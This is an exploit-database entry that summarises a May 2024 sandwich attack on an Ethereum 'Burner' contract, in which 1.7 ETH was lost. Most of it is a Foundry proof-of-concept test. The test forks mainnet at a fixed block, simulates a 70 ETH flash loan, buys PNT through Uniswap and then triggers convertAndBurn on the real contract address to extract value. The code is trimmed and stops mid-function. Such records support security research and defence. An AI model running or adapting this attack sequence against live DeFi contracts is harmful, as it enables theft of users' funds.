# [?] Burner - sandwich ack

## Summary
Severity: Unknown
Chain: Ethereum
Component: Burner
Published: 2024-05-22
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Burner_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1.7 eth

```solidity
contract ContractTest is Test {
    IBurner burner_ = IBurner(0x4d4d05e1205e3A412ae1469C99e0d954113aa76F);
    IERC20 usdt_ = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 wbtc_ = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 pnt_ = IERC20(0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD);
    IWETH weth_ = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));

    IUniswapV2Router router_ = IUniswapV2Router(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));

    function setUp() public {
        vm.createSelectFork("mainnet", 19_917_290);
        vm.deal(address(this), 0);
    }

    function testExploit() public {
        vm.deal(address(this), 70 ether); //simulation flashloan
        weth_.deposit{value: 70 ether}();
        weth_.approve(address(router_), type(uint256).max);
        pnt_.approve(address(router_), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(weth_);
        path[1] = address(pnt_);
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            weth_.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        console.log("=== ACK START ===");
        address[] memory tokens = new address[](3);
        tokens[0] = address(0x0);
        tokens[1] = address(wbtc_);
        tokens[2] = address(usdt_);
        burner_.convertAndBurn(tokens);
        console.log("=== ACK END ===");

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Burner_exp.sol_
